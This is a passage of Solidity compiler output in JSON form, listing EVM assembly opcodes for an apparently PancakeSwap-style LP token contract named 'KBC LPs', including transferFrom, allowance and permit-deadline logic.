											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP3"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "AND"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "C0"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH [tag]",
											"value": "60"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "tag",
											"value": "58"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "JUMPDEST"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "STOP"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "tag",
											"value": "16"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "JUMPDEST"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "62"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "62"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "AND"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "ADD"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "AND"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "tag",
											"value": "21"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMPDEST"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "7"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "4B4243204C5073"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "C8"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "tag",
											"value": "28"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMPDEST"
										},
										{
											"begin": 2877,
											"end": 2881,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2893,
											"end": 2929,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 2902,
											"end": 2912,
											"name": "CALLER"
										},
										{
											"begin": 2914,
											"end": 2921,
											"name": "DUP5"
										},
										{
											"begin": 2923,
											"end": 2928,
											"name": "DUP5"
										},
										{
											"begin": 2893,
											"end": 2901,
											"name": "PUSH [tag]",
											"value": "66"
										},
										{
											"begin": 2893,
											"end": 2929,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2893,
											"end": 2929,
											"name": "tag",
											"value": "65"
										},
										{
											"begin": 2893,
											"end": 2929,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 2946,
											"end": 2950,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "tag",
											"value": "64"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMPDEST"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP3"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP2"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "POP"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "POP"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "tag",
											"value": "30"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "JUMPDEST"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SLOAD"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "DUP2"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "tag",
											"value": "33"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "DUP4"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "AND"
										},
										{
											"begin": 3219,
											"end": 3223,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "SWAP1"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "DUP2"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "MSTORE"
										},
										{
											"begin": 3239,
											"end": 3248,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "SWAP1"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "DUP2"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "MSTORE"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "DUP1"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "DUP4"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "KECCAK256"
										},
										{
											"begin": 3255,
											"end": 3265,
											"name": "CALLER"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "DUP5"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "MSTORE"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "SWAP1"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "SWAP2"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "MSTORE"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "DUP2"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "KECCAK256"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 3239,
											"end": 3281,
											"name": "EQ"
										},
										{
											"begin": 3235,
											"end": 3406,
											"name": "PUSH [tag]",
											"value": "68"
										},
										{
											"begin": 3235,
											"end": 3406,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "DUP5"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "AND"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "SWAP1"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "DUP2"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "MSTORE"
										},
										{
											"begin": 3327,
											"end": 3336,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "SWAP1"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "DUP2"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "MSTORE"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "DUP1"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "DUP4"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "KECCAK256"
										},
										{
											"begin": 3343,
											"end": 3353,
											"name": "CALLER"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "DUP5"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "MSTORE"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "SWAP1"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "SWAP2"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "MSTORE"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "SWAP1"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "KECCAK256"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "SLOAD"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "PUSH [tag]",
											"value": "69"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "SWAP1"
										},
										{
											"begin": 3376,
											"end": 3381,
											"name": "DUP4"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3327,
											"end": 3358,
											"name": "PUSH [tag]",
											"value": "70"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "AND"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "tag",
											"value": "69"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "DUP6"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "AND"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "SWAP1"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "DUP2"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "MSTORE"
										},
										{
											"begin": 3297,
											"end": 3306,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "SWAP1"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "DUP2"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "MSTORE"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "DUP1"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "DUP4"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "KECCAK256"
										},
										{
											"begin": 3313,
											"end": 3323,
											"name": "CALLER"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "DUP5"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "MSTORE"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "SWAP1"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "SWAP2"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "MSTORE"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "SWAP1"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "KECCAK256"
										},
										{
											"begin": 3297,
											"end": 3395,
											"name": "SSTORE"
										},
										{
											"begin": 3235,
											"end": 3406,
											"name": "tag",
											"value": "68"
										},
										{
											"begin": 3235,
											"end": 3406,
											"name": "JUMPDEST"
										},
										{
											"begin": 3415,
											"end": 3441,
											"name": "PUSH [tag]",
											"value": "71"
										},
										{
											"begin": 3425,
											"end": 3429,
											"name": "DUP5"
										},
										{
											"begin": 3431,
											"end": 3433,
											"name": "DUP5"
										},
										{
											"begin": 3435,
											"end": 3440,
											"name": "DUP5"
										},
										{
											"begin": 3415,
											"end": 3424,
											"name": "PUSH [tag]",
											"value": "72"
										},
										{
											"begin": 3415,
											"end": 3441,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3415,
											"end": 3441,
											"name": "tag",
											"value": "71"
										},
										{
											"begin": 3415,
											"end": 3441,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 3458,
											"end": 3462,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP4"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP3"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "POP"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "POP"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "POP"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "tag",
											"value": "35"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "JUMPDEST"
										},
										{
											"begin": 706,
											"end": 772,
											"name": "PUSH",
											"value": "6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "DUP2"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "tag",
											"value": "37"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "JUMPDEST"
										},
										{
											"begin": 299,
											"end": 301,
											"name": "PUSH",
											"value": "12"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "DUP2"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "tag",
											"value": "39"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "JUMPDEST"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "SLOAD"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "DUP2"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "tag",
											"value": "42"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "JUMPDEST"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH",
											"value": "3"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "MSTORE"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "SWAP1"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "DUP2"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "MSTORE"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "SWAP1"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "KECCAK256"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "SLOAD"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "DUP2"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "tag",
											"value": "45"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "JUMPDEST"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "MSTORE"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "SWAP1"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "DUP2"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "MSTORE"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "SWAP1"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "KECCAK256"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "SLOAD"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "DUP2"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "tag",
											"value": "48"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "JUMPDEST"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH",
											"value": "5"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "MSTORE"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "SWAP1"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "DUP2"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "MSTORE"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "SWAP1"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "KECCAK256"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "SLOAD"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "DUP2"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "tag",
											"value": "50"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "JUMPDEST"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "MLOAD"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "DUP1"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "ADD"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "MSTORE"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "DUP1"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH",
											"value": "6"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "DUP2"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "MSTORE"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "ADD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "4B42432D4C5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "D4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "DUP2"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "MSTORE"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "POP"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "DUP2"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "tag",
											"value": "57"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "JUMPDEST"
										},
										{
											"begin": 3026,
											"end": 3030,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3042,
											"end": 3074,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 3052,
											"end": 3062,
											"name": "CALLER"
										},
										{
											"begin": 3064,
											"end": 3066,
											"name": "DUP5"
										},
										{
											"begin": 3068,
											"end": 3073,
											"name": "DUP5"
										},
										{
											"begin": 3042,
											"end": 3051,
											"name": "PUSH [tag]",
											"value": "72"
										},
										{
											"begin": 3042,
											"end": 3074,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "tag",
											"value": "60"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "JUMPDEST"
										},
										{
											"begin": 3688,
											"end": 3703,
											"name": "TIMESTAMP"
										},
										{
											"begin": 3676,
											"end": 3684,
											"name": "DUP5"
										},
										{
											"begin": 3676,
											"end": 3703,
											"name": "LT"
										},
										{
											"begin": 3676,
											"end": 3703,
											"name": "ISZERO"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH [tag]",
											"value": "76"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "JUMPI"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP1"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP2"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MSTORE"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP3"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "ADD"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MSTORE"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP3"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "ADD"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E8811561412549151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "82"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP3"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "ADD"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MSTORE"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "SWAP1"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MLOAD"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "SWAP1"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP2"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "SWAP1"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "SUB"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "ADD"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "SWAP1"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "REVERT"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "tag",
											"value": "76"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "JUMPDEST"
										},
										{
											"begin": 3836,
											"end": 3852,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3836,
											"end": 3852,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP1"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP10"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "AND"
										},
										{
											"begin": 3734,
											"end": 3748,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP2"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP2"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "MSTORE"
										},
										{
											"begin": 4073,
											"end": 4079,
											"name": "PUSH",
											"value": "5"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "SWAP1"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP2"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "MSTORE"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP1"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP4"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "KECCAK256"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "DUP1"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "SLOAD"
										},
										{
											"begin": 4073,
